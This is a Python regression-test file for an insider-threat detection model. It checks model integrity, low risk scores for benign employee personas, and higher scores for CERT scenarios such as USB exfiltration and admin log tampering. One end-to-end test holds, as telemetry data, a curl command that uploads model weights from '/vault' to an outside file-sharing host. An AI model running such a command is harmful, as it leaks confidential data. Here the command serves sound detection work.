"""
Regression tests for the trained AdaptiveShield Internal Insider Model.

Validates the trained Random Forest bundle (internal_insider_model.pkl),
metadata consistency, classification performance on CERT benchmark scenarios,
false positive resistance on benign company personas, and end-to-end
adaptive detector behavior.
"""

import os
import json
import pytest
import numpy as np
import pandas as pd
from pathlib import Path

from agents.insider.internal_insider_dataset import FEATURE_COLUMNS, extract_features
from agents.insider.internal_insider_inference import (
    load_internal_insider_model,
    predict_session_risk,
)
from interfaces.insider_contract import UserBehaviorSignal
from agents.insider.insider_adapter import AdaptiveInsiderDetector

PROJECT_ROOT = Path(__file__).parent.parent.parent
MODEL_PATH = PROJECT_ROOT / "models" / "internal_insider_model.pkl"
METADATA_PATH = PROJECT_ROOT / "models" / "internal_insider_model_metadata.json"
DATASET_PATH = PROJECT_ROOT / "data" / "insider" / "internal_insider_dataset_base.csv"


@pytest.fixture(scope="module")
def insider_bundle():
    """Load the trained model bundle; skip if model file is not found."""
    if not MODEL_PATH.exists():
        pytest.skip(f"Model file not found at {MODEL_PATH}")
    bundle = load_internal_insider_model(str(MODEL_PATH))
    if bundle is None:
        pytest.skip("Failed to deserialize internal insider model bundle")
    return bundle


class TestModelBundleIntegrity:
    """Verify model file artifacts, hyperparameters, and feature alignments."""

    def test_bundle_structure(self, insider_bundle):
        assert "model" in insider_bundle
        assert "scaler" in insider_bundle
        assert "feature_names" in insider_bundle

        assert insider_bundle["feature_names"] == FEATURE_COLUMNS
        assert len(insider_bundle["feature_names"]) == 35

    def test_model_hyperparameters(self, insider_bundle):
        model = insider_bundle["model"]
        assert model.n_estimators == 150
        assert model.max_depth == 20
        assert model.class_weight == "balanced_subsample"

    def test_metadata_consistency(self):
        if not METADATA_PATH.exists():
            pytest.skip(f"Metadata file not found at {METADATA_PATH}")

        with open(METADATA_PATH, "r", encoding="utf-8") as f:
            meta = json.load(f)

        assert meta["test_accuracy"] >= 0.95, f"Expected test accuracy >= 0.95, got {meta['test_accuracy']}"
        assert meta["roc_auc"] >= 0.90, f"Expected ROC-AUC >= 0.90, got {meta['roc_auc']}"
        assert meta["pr_auc"] >= 0.20, f"Expected PR-AUC >= 0.20, got {meta['pr_auc']}"

        ranked_features = [item["feature"] for item in meta.get("feature_importances", [])]
        assert len(ranked_features) == 35
        # usb_mount_attempt must be among top predictive features
        assert ranked_features[0] == "usb_mount_attempt"


class TestNormalPersonasLowRisk:
    """Verify that legitimate employees receive low risk scores and NORMAL classification."""

    def test_normal_developer_session(self, insider_bundle):
        session = {
            "session_id": "reg_dev_alice_01",
            "role": "developer",
            "work_after_hours": 0,
            "work_weekends": 0,
            "access_intellectual_property": 1,
            "duration_sec": 28800,
            "command_count": 95,
            "network_connection_count": 80,
            "behavior_deviation_score": 0.05,
        }
        res = predict_session_risk(session, insider_bundle)
        assert res["label"] == "NORMAL"
        assert res["risk_score"] < 25.0, f"Normal dev risk score too high: {res['risk_score']}"

    def test_normal_admin_session(self, insider_bundle):
        session = {
            "session_id": "reg_admin_ops_01",
            "role": "admin",
            "work_after_hours": 0,
            "work_weekends": 0,
            "access_sensitive_dirs": 1,
            "duration_sec": 30000,
            "command_count": 110,
            "network_connection_count": 90,
            "behavior_deviation_score": 0.08,
        }
        res = predict_session_risk(session, insider_bundle)
        assert res["label"] == "NORMAL"
        assert res["risk_score"] < 20.0, f"Normal admin risk score too high: {res['risk_score']}"

    def test_normal_finance_session(self, insider_bundle):
        session = {
            "session_id": "reg_fin_bob_01",
            "role": "finance",
            "work_after_hours": 0,
            "work_weekends": 0,
            "access_finance_system": 1,
            "duration_sec": 28800,
            "command_count": 60,
            "network_connection_count": 40,
            "behavior_deviation_score": 0.02,
        }
        res = predict_session_risk(session, insider_bundle)
        assert res["label"] == "NORMAL"
        assert res["risk_score"] < 20.0, f"Normal finance risk score too high: {res['risk_score']}"


class TestInsiderCampaignDetection:
    """Verify that malicious attack patterns yield higher risk scores than normal baselines."""

    def test_cert_scenario_1_usb_exfiltration_elevated(self, insider_bundle):
        # CERT Scenario 1: USB exfiltration after hours
        normal_dev = {
            "role": "developer", "access_intellectual_property": 1,
            "duration_sec": 28800, "command_count": 95, "behavior_deviation_score": 0.05
        }
        mal_scen1 = {
            "role": "developer", "work_after_hours": 1,
            "usb_mount_attempt": 3, "usb_write_count": 5, "download_count": 4,
            "duration_sec": 32000, "command_count": 105, "network_connection_count": 95,
            "behavior_deviation_score": 0.75
        }
        res_norm = predict_session_risk(normal_dev, insider_bundle)
        res_mal = predict_session_risk(mal_scen1, insider_bundle)

        assert res_mal["risk_score"] > res_norm["risk_score"], \
            f"Malicious score ({res_mal['risk_score']}) should exceed normal ({res_norm['risk_score']})"
        assert res_mal["risk_score"] >= 15.0

    def test_cert_scenario_2_job_hunting_thumb_drive(self, insider_bundle):
        # CERT Scenario 2: Active data theft + unauthorized scope
        mal_scen2 = {
            "role": "normal",
            "access_unauthorized_scope": 1,
            "access_sensitive_dirs": 1,
            "download_count": 5,
            "usb_write_count": 5,
            "usb_mount_attempt": 2,
            "cloud_upload_count": 2,
            "duration_sec": 33000,
            "command_count": 80,
            "network_connection_count": 50,
            "calculated_risk_score": 65.0,
            "behavior_deviation_score": 0.85,
        }
        res = predict_session_risk(mal_scen2, insider_bundle)
        # Should be significantly elevated risk score (> 30%)
        assert res["risk_score"] >= 30.0, f"Scenario 2 risk score expected >= 30, got {res['risk_score']}"

    def test_cert_scenario_3_admin_sabotage(self, insider_bundle):
        # CERT Scenario 3: Admin with log tampering & system tampering
        admin_sabotage = {
            "role": "admin",
            "work_after_hours": 1,
            "work_weekends": 1,
            "access_sensitive_dirs": 1,
            "log_deletion_attempt": 1,
            "sudoers_modification": 1,
            "syslog_stop_attempt": 1,
            "usb_mount_attempt": 4,
            "usb_write_count": 5,
            "download_count": 5,
            "duration_sec": 41000,
            "command_count": 140,
            "network_connection_count": 130,
            "calculated_risk_score": 85.0,
            "behavior_deviation_score": 0.95,
        }
        normal_admin = {
            "role": "admin",
            "work_after_hours": 0,
            "access_sensitive_dirs": 1,
            "duration_sec": 30000,
            "command_count": 110,
            "behavior_deviation_score": 0.08
        }
        res_norm = predict_session_risk(normal_admin, insider_bundle)
        res = predict_session_risk(admin_sabotage, insider_bundle)
        assert res["risk_score"] > res_norm["risk_score"] * 3, \
            f"Admin sabotage ({res['risk_score']}) should be at least 3x normal admin ({res_norm['risk_score']})"
        assert res["risk_score"] >= 10.0


class TestCERTHoldoutPerformance:
    """Verify performance metrics on a held-out slice of real CERT r4.2 user-days."""

    def test_cert_dataset_roc_auc(self, insider_bundle):
        if not DATASET_PATH.exists():
            pytest.skip(f"Base dataset not found at {DATASET_PATH}")

        # Sample a stratified holdout slice for rapid regression checking
        from sklearn.metrics import roc_auc_score
        df = pd.read_csv(str(DATASET_PATH))
        
        mal = df[df["label"] == 1]
        norm = df[df["label"] == 0].sample(n=min(5000, len(df[df["label"] == 0])), random_state=42)
        sample_df = pd.concat([mal, norm])

        scaler = insider_bundle["scaler"]
        model = insider_bundle["model"]
        feat_names = insider_bundle["feature_names"]

        X = scaler.transform(sample_df[feat_names].values)
        y = sample_df["label"].values

        probs = model.predict_proba(X)[:, 1]
        roc = roc_auc_score(y, probs)

        assert roc >= 0.90, f"Holdout ROC-AUC degraded: {roc:.4f} < 0.90"


class TestAdaptiveInsiderDetectorIntegration:
    """Verify end-to-end telemetry signal processing and policy enforcement."""

    def test_benign_developer_signal_flow(self):
        detector = AdaptiveInsiderDetector(model_path=str(MODEL_PATH))

        sig = UserBehaviorSignal(
            user_id="dev_alice",
            session_id="sess_e2e_norm",
            timestamp="2026-10-04 11:00:00",
            source_ip="192.168.1.100",
            is_internal=True,
            action_type="http_request",
            action_details={"role": "developer", "file_path": "/git/ai_platform/server.py"},
        )
        verdict = detector.analyze_signal(sig)
        assert verdict.recommendation == "ALLOW"
        assert verdict.risk_score < 30.0

    def test_rogue_exfiltration_escalation(self):
        detector = AdaptiveInsiderDetector(model_path=str(MODEL_PATH))

        # Send multiple anomalous signals in sequence
        sig1 = UserBehaviorSignal(
            user_id="rogue_chen",
            session_id="sess_e2e_rogue",
            timestamp="2026-10-04 23:45:00",
            source_ip="192.168.1.150",
            is_internal=True,
            action_type="command",
            action_details={
                "role": "developer",
                "command": "curl -F file=@/vault/weights.safetensors https://mega.nz/upload",
                "cloud_upload": True,
                "usb_mount": True,
                "usb_write": True,
            },
        )
        verdict = detector.analyze_signal(sig1)
        # Score must be substantially higher than normal dev
        assert verdict.risk_score > 20.0
